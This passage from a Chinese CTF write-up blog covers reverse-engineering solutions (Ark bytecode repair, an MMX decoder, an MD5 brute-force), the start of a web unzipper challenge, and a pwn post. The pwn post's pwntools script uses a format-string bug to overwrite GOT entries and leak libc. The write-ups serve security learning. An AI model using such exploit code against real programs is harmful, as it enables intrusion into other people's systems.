class="type">char</span> *pKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\tFound:\t&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;KeyLength;j++)</span><br><span class="line">        <span class="built_in">printf</span>(szFmtHex2, pKey[j]);</span><br><span class="line"></span><br><span class="line">    dw1 = <span class="built_in">GetTickCount</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t%d.%d sec.\n&quot;</span>, (dw1 - dw0)/<span class="number">1000</span>, (dw1 - dw0)%<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<style>.yfjyxartnpoi{zoom:67%;}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137193-3.png" class="yfjyxartnpoi" alt="img">

<p>而后用得到的密钥<code>B7 BC 71 42</code>对密文进行解密，可以发现能够得到正确的pe格式</p>
<p>里面是一个白盒aes加密算法</p>
<p>解白盒aes方法：<a target="_blank" rel="noopener" href="https://www.zskkk.cn/posts/15785/">https://www.zskkk.cn/posts/15785/</a></p>
<style>.bpzpldyddadv{zoom:67%;}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137193-4.png" class="bpzpldyddadv" alt="img">

<style>.cydpksjywtrp{zoom:67%;}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137193-5.png" class="cydpksjywtrp" alt="img">

<p>key&#x3D; 009CF29131C8E4EA81BD5DD248E6F3E0</p>
<p>密文：61E2312BDB5D41BF03F604A7F478680E41AB532035C2B87894E140F40A9F0F0795C6208C653C8C2732B026A83614F04F6D44CB66BB784726881EABC3FDF283CB</p>
<p>flag{7h3_Pyr4m1d_0f_Py7h0n_4w4175_175_M4573r_R3v3r53r_uJ6gG3qVs}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/18/n1ctfjunior-re/" data-id="cuidIOkdc9Fy33C5lR_iInfFH" data-title="n1ctfjunior-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2025-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/01/qwb2025-re/" class="article-date">
  <time class="dt-published" datetime="2025-11-01T02:15:47.000Z" itemprop="datePublished">2025-11-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="trade"><a href="#trade" class="headerlink" title="trade"></a>trade</h2><p>docker desktop代理设置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;builder&quot;: &#123;</span><br><span class="line">    &quot;gc&quot;: &#123;</span><br><span class="line">      &quot;defaultKeepStorage&quot;: &quot;20GB&quot;,</span><br><span class="line">      &quot;enabled&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;experimental&quot;: false,</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.1panel.live/&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动态调试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./tragre</span><br><span class="line">pgrep -fl tradre </span><br><span class="line">gdbserver :1234 --attach 8900 </span><br></pre></td></tr></table></figure>



<h2 id="ABabyChal"><a href="#ABabyChal" class="headerlink" title="ABabyChal"></a>ABabyChal</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ark_js_vm chal.abc</span><br></pre></td></tr></table></figure>

<p>指的是运行 <strong>Ark 引擎 (Ark JavaScript VM)</strong> 来执行一个 <strong>编译好的字节码文件 <code>chal.abc</code></strong>。</p>
<p><code>.abc</code> 文件是 <strong>Ark ByteCode</strong>（方舟字节码）文件。<br> 这是鸿蒙系统中由 <code>arkcompile</code> 或 <code>es2abc</code> 工具生成的中间格式。</p>
<p>Disassembler是ArkTS反汇编工具。如果需要分析方舟字节码文件（*.abc）相关问题，开发者可以使用Disassembler将方舟字节码文件反编译为可读的汇编指令。</p>
<p>工具随DevEco Studio SDK发布。以Windows平台为例，Disassembler工具位于DevEco Studio&#x2F;sdk&#x2F;default&#x2F;openharmony&#x2F;toolchains&#x2F;ark_disasm.exe。</p>
<p>报错了，换一个工具：jadx-dev-all.jar，读取abc文件的jdax工具。</p>
<p>方舟字节码文件格式：</p>
<p>字节码文件起始于<a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/arkts-bytecode-file-format-V5#header">Header</a>结构。文件中的所有结构均可以从Header出发，直接或间接地访问到。字节码文件中所有的多字节值均采用小端字节序。</p>
<p>Header：</p>
<table>
<thead>
<tr>
<th align="left"><strong>名称</strong></th>
<th align="left"><strong>格式</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">magic</td>
<td align="left">uint8_t[8]</td>
<td align="left">文件头魔数，值必须是’P’ ‘A’ ‘N’ ‘D’ ‘A’ ‘\0’ ‘\0’ ‘\0’。</td>
</tr>
<tr>
<td align="left">checksum</td>
<td align="left">uint32_t</td>
<td align="left">字节码文件除文件头魔数和本校验字段之外的内容的adler32校验和。</td>
</tr>
<tr>
<td align="left">version</td>
<td align="left">uint8_t[4]</td>
<td align="left">字节码文件的版本号 (<a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/arkts-bytecode-file-format-V5#version">Version</a>) 。</td>
</tr>
</tbody></table>
<p>执行abc文件：</p>
<style>.rffpqlpmdret{zoom: 80%;}</style><img src="/2025/11/01/qwb2025-re/image-20251019011550085.png" class="rffpqlpmdret" alt="image-20251019011550085">

<p><code>v80</code> 是一个 <code>std::vector&lt;std::string&gt;</code> 的底层数组，存储分割后的 ABC 文件路径（或者入口函数信息）。</p>
<p>循环调用：panda::JSNApi::Execute(EcmaVM, path, &amp;entry, 0, &amp;set)</p>
<p><strong>参数解释：</strong></p>
<ul>
<li><code>EcmaVM</code>：VM 实例</li>
<li><code>path</code>：ABC 文件路径</li>
<li><code>entry</code>：入口函数名（可以是默认 <code>main</code> 或者用户指定）</li>
<li><code>0</code>：执行选项</li>
<li><code>&amp;set</code>：可能是执行上下文或返回值存储</li>
</ul>
<p><strong>作用：</strong> 把 <code>.abc</code> 文件加载到 VM 并执行。</p>
<p>用jadx-dev-all.jar打开.abc文件有大量报错，猜测修改了字节码。搜索找到一份字节码表： <a target="_blank" rel="noopener" href="https://www.seaxiang.com/blog/JdVvVU#menu_7">harmony 鸿蒙Ark Bytecode Fundamentals</a></p>
<p>或者搜索⼀圈后找到函数 panda::ecmascript::RuntimeStubs::DebugPrintInstruction </p>
<p>尝试在libark_jsruntime.so中搜索一个字节码名称，还真能找到：  </p>
<style>.llpbsfgwkqtm{zoom:80%;}</style><img src="/2025/11/01/qwb2025-re/image-20251020140119923.png" class="llpbsfgwkqtm" alt="image-20251020140119923">

<p>根据这个字节码找到修改后的字节码表函数sub_1F73E90:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_1F73E90(__int64 a1, unsigned __int8 **a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  char *v4; // rsi</span><br><span class="line">  const char *v5; // rsi</span><br><span class="line">  const char *v6; // rsi</span><br><span class="line">  const char *v7; // rsi</span><br><span class="line">  const char *v8; // rsi</span><br><span class="line">  const char *v9; // rsi</span><br></pre></td></tr></table></figure>

<p>根据这个函数修复.abc文件中的字节码，得到的out.abc可以使用刚才的工具反编译。</p>
<p><code>validateChallenge</code> 的处理管线（正向）大致是：</p>
<ol>
<li>把用户输入当作 Base64 解码（<code>definefunc2</code>）。</li>
<li>用一个替换表对字符做简单替换（createobjectwithbuffer）。</li>
<li>对字母&#x2F;数字做逐位可变的 Caesar 位移（每位不同的偏移 <code>(i*17+23)%26</code>）。</li>
<li>对每字节做按位循环左移（移位量依赖于状态机 i7&#x2F;i8）。</li>
<li>将结果每 6 字节一组反转（reverse 每 6 字符块）。</li>
<li>把字符串用 3 个不同的字节数组作为循环 key 做三轮 <code>xor</code>（每轮：<code>(byte ^ key[(i*11)%len(key)]) ^ ((i*3)&amp;255)</code>）。</li>
<li>再按一个固定的索引置换（permutation array）抽取出最终的字节序列 <code>r42</code>，并对其做 Base64 编码后与常量字符串比较。</li>
</ol>
<p>得到的结果大部分正确，最后两字节有问题，根据题目提示md5爆⼀下即可。  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = b&#x27;flag&#123;4f9cc0d2b33f5d7e2b0955765bb33f0&#x27;</span><br><span class="line">from hashlib import md5</span><br><span class="line">for i in &#x27;0123456789abcdef&#x27;:</span><br><span class="line">	if md5(s + i.encode() + b&#x27;&#125;&#x27;).hexdigest() ==</span><br><span class="line">&#x27;7a2028696ca643a57ddeda6642f781ae&#x27;:</span><br><span class="line">	print(s + i.encode() + b&#x27;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># flag&#123;4f9cc0d2b33f5d7e2b0955765bb33f0a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="butterfly"><a href="#butterfly" class="headerlink" title="butterfly"></a>butterfly</h2><p>核心编码逻辑在MMX部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v29 = _m_pxor(v28-&gt;m64_u64, v42[0]);        // XOR</span><br><span class="line">v30 = _m_por(_m_psrlwi(v29, 8u), _m_psllwi(v29, 8u));  // 字节交换</span><br><span class="line">v28-&gt;m64_u64 = _m_paddb(_m_por(_m_psllqi(v30, 1u), _m_psrlqi(v30, 0x3Fu)), v42[0]);  // 循环移位+加法</span><br></pre></td></tr></table></figure>

<p>逆这个过程</p>
<p>密钥信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v24 = _mm_loadu_si128((const __m128i *)&quot;MMXEncode2024&quot;);</span><br></pre></td></tr></table></figure>

<p>程序会生成：</p>
<ul>
<li>编码后的数据文件</li>
<li>对应的<code>.key</code>密钥文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encoded.dat:8F A3 9C B7 70 8D 8F 98 9D BF 8C 99 8C 73 E5 90</span><br><span class="line">8D 8D 8C 85 88 79 85 7C 9D 9F 3C 53 16 15 19 12</span><br><span class="line">36 37 7D 0A</span><br><span class="line">encoded.dat.key:4D 4D 58 45 6E 63 6F 64 65 32 30 32 34 00 45 6E</span><br><span class="line">63 6F 64 69 6E 67 20 66 69 6C 65 3A 20 25 73 0A</span><br></pre></td></tr></table></figure>

<p><strong>encoded.dat.key</strong>:<br>前13字节是密钥：<code>4D 4D 58 45 6E 63 6F 64 65 32 30 32 34</code> &#x3D; <code>&quot;MMXEncode2024&quot;</code></p>
<p>从代码看，编码步骤是：</p>
<ol>
<li><code>_m_pxor</code> - XOR操作</li>
<li><code>_m_por(_m_psrlwi(v29, 8u), _m_psllwi(v29, 8u))</code> - 字节交换</li>
<li><code>_m_por(_m_psllqi(v30, 1u), _m_psrlqi(v30, 0x3Fu))</code> - 循环左移1位</li>
<li><code>_m_paddb</code> - 字节加法</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">def mmx_decode_precise(encoded_data, key):</span><br><span class="line">    key_bytes = key.ljust(8, b&#x27;\x00&#x27;)[:8]  # 取前8字节作为XOR密钥</span><br><span class="line">    key_qword = int.from_bytes(key_bytes, &#x27;little&#x27;)</span><br><span class="line">    </span><br><span class="line">    decoded = bytearray()</span><br><span class="line">    </span><br><span class="line">    for i in range(0, len(encoded_data), 8):</span><br><span class="line">        chunk = encoded_data[i:i+8]</span><br><span class="line">        if len(chunk) &lt; 8:</span><br><span class="line">            chunk = chunk + b&#x27;\x00&#x27; * (8 - len(chunk))</span><br><span class="line">        </span><br><span class="line">        encrypted = int.from_bytes(chunk, &#x27;little&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 逆向 _m_paddb</span><br><span class="line">        temp1 = encrypted</span><br><span class="line">        temp1_bytes = bytearray()</span><br><span class="line">        for j in range(8):</span><br><span class="line">            byte_val = (temp1 &gt;&gt; (j * 8)) &amp; 0xFF</span><br><span class="line">            # 减去key的对应字节</span><br><span class="line">            key_byte = (key_qword &gt;&gt; (j * 8)) &amp; 0xFF</span><br><span class="line">            temp1_bytes.append((byte_val - key_byte) &amp; 0xFF)</span><br><span class="line">        temp1 = int.from_bytes(temp1_bytes, &#x27;little&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 逆向循环移位: 右移1位 (原先是左移1位)</span><br><span class="line">        temp2 = ((temp1 &gt;&gt; 1) | ((temp1 &amp; 1) &lt;&lt; 63)) &amp; 0xFFFFFFFFFFFFFFFF</span><br><span class="line">        </span><br><span class="line">        # 逆向字节交换 (16位字内交换字节)</span><br><span class="line">        temp3_bytes = bytearray()</span><br><span class="line">        temp2_bytes = temp2.to_bytes(8, &#x27;little&#x27;)</span><br><span class="line">        for j in range(0, 8, 2):</span><br><span class="line">            if j + 1 &lt; 8:</span><br><span class="line">                temp3_bytes.append(temp2_bytes[j + 1])</span><br><span class="line">                temp3_bytes.append(temp2_bytes[j])</span><br><span class="line">            else:</span><br><span class="line">                temp3_bytes.append(temp2_bytes[j])</span><br><span class="line">        temp3 = int.from_bytes(temp3_bytes, &#x27;little&#x27;)</span><br><span class="line">        </span><br><span class="line">        # XOR解密</span><br><span class="line">        decrypted = temp3 ^ key_qword</span><br><span class="line">        </span><br><span class="line">        decrypted_bytes = decrypted.to_bytes(8, &#x27;little&#x27;)</span><br><span class="line">        decoded.extend(decrypted_bytes[:min(8, len(encoded_data)-i)])</span><br><span class="line">    </span><br><span class="line">    return bytes(decoded)</span><br><span class="line"></span><br><span class="line"># 编码的数据</span><br><span class="line">encoded_hex = &quot;8F A3 9C B7 70 8D 8F 98 9D BF 8C 99 8C 73 E5 90 8D 8D 8C 85 88 79 85 7C 9D 9F 3C 53 16 15 19 12 36 37 7D 0A&quot;</span><br><span class="line">encoded_bytes = bytes.fromhex(encoded_hex.replace(&quot; &quot;, &quot;&quot;))</span><br><span class="line"></span><br><span class="line"># 密钥</span><br><span class="line">key = b&quot;MMXEncode2024&quot;</span><br><span class="line"></span><br><span class="line">print(f&quot;编码数据长度: &#123;len(encoded_bytes)&#125; 字节&quot;)</span><br><span class="line">print(f&quot;密钥: &#123;key&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 解码</span><br><span class="line">decoded_result = mmx_decode_precise(encoded_bytes, key)</span><br><span class="line">print(&quot;\n解码结果 (十六进制):&quot;, decoded_result.hex())</span><br><span class="line">print(&quot;解码结果 (原始字节):&quot;, decoded_result)</span><br><span class="line">print(&quot;\n可读文本:&quot;, decoded_result.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))</span><br><span class="line"></span><br><span class="line"># 尝试不同的编码</span><br><span class="line">try:</span><br><span class="line">    print(&quot;作为ASCII:&quot;, decoded_result.decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;))</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 显示每个字节的值</span><br><span class="line">print(&quot;\n字节分析:&quot;)</span><br><span class="line">for i, byte in enumerate(decoded_result):</span><br><span class="line">    print(f&quot;字节[&#123;i:2d&#125;]: 0x&#123;byte:02X&#125; = &#123;byte:3d&#125; = &#x27;&#123;chr(byte) if 32 &lt;= byte &lt; 127 else &#x27;?&#x27;&#125;&#x27;&quot;)</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/01/qwb2025-re/" data-id="cuid0P0QLBFLn499T3dQ--ylw" data-title="qwb2025-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2025-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/25/qwb2025-pwn/" class="article-date">
  <time class="dt-published" datetime="2025-10-25T12:37:58.000Z" itemprop="datePublished">2025-10-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>解体思路写代码里面了<br>由于scanf向data段的全局变量里读，因此可以覆盖同样存在于data段中的printf的参数的字符串，构造格式化字符串漏洞，注意这里的格式化字符串漏洞写入内容不在栈上，但是read函数可以读0x10字节在栈上<br>（覆盖memset地址时只用覆盖低6位即可）<br>（建议自己调试时候把putchr下面的sleep逻辑patch掉，节省时间）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 第一次泄露libc地址，并且将fclose got重定向到main的起始地址  </span></span><br><span class="line">    fclose_got = elf.got[<span class="string">&#x27;fclose&#x27;</span>]</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">    fclose_got = elf.got[<span class="string">&#x27;fclose&#x27;</span>]</span><br><span class="line">    main_addr = <span class="number">0x40139B</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> </span><br><span class="line">    fmtstr = <span class="string">f&#x27;%<span class="subst">&#123;main_addr &#125;</span>c%12$hn&#x27;</span>.encode()+ <span class="string">b&#x27;---%25$p----&#x27;</span></span><br><span class="line">    payload += fmtstr</span><br><span class="line">    sla(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,p64(fclose_got))</span><br><span class="line">    ru(<span class="string">b&#x27;---&#x27;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(ru(<span class="string">b&#x27;----&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x2a1ca</span></span><br><span class="line">    leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 取消exit,并且使其执行时跳转到fget获取flag</span></span><br><span class="line">    <span class="comment"># 401660</span></span><br><span class="line">    fgets_flag_instr =<span class="number">0x4014F9</span></span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> </span><br><span class="line">    fmtstr = <span class="string">f&#x27;%<span class="subst">&#123;fgets_flag_instr &#125;</span>c%12$hn&#x27;</span>.encode()</span><br><span class="line">    payload += fmtstr</span><br><span class="line">    </span><br><span class="line">    sla(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,p64(exit_got))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将 memset 改为 puts</span></span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">    puts_addr = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> </span><br><span class="line">    padding1 = (puts_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    fmtstr = <span class="string">f&#x27;%<span class="subst">&#123;padding1&#125;</span>c%13$hhn&#x27;</span>.encode()</span><br><span class="line">    padding2 = puts_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    fmtstr += <span class="string">f&#x27;%<span class="subst">&#123;padding2-padding1&#125;</span>c%12$hn&#x27;</span>.encode() </span><br><span class="line">    payload += fmtstr</span><br><span class="line">    sla(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>,payload)</span><br><span class="line">    memset_got = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,p64(memset_got)+p64(memset_got+<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/25/qwb2025-pwn/" data-id="cuid18H8l4FK0c3KXXPUt2ayp" data-title="qwb2025-pwn flagmarket" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-junior" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/10/junior/" class="article-date">
  <time class="dt-published" datetime="2025-10-10T12:06:01.000Z" itemprop="datePublished">2025-10-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h3><p>提供功能：上传压缩文件、成功解压后可以下载</p>
<p>flag 存放在根目录，文件名带随机字符：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RAND=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&#x27;a-zA-Z0-9&#x27;</span> | <span class="built_in">head</span> -c 32)</span><br><span class="line">FLAG_FILE=<span class="string">&quot;/flag-<span class="variable">$RAND</span>.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$FLAG_FILE</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"><span class="built_in">export</span> FLAG=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>upload 关键代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="comment"># 从session中获取当前用户的 role</span></span><br><span class="line">        role = session[<span class="string">&quot;role&quot;</span>]</span><br><span class="line">        <span class="comment"># admin 则可指定 dirname，否则随机文件夹名</span></span><br><span class="line">        <span class="keyword">if</span> role == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            dirname = request.form.get(<span class="string">&quot;dirname&quot;</span>) <span class="keyword">or</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dirname = <span class="built_in">str</span>(uuid.uuid4())</span><br><span 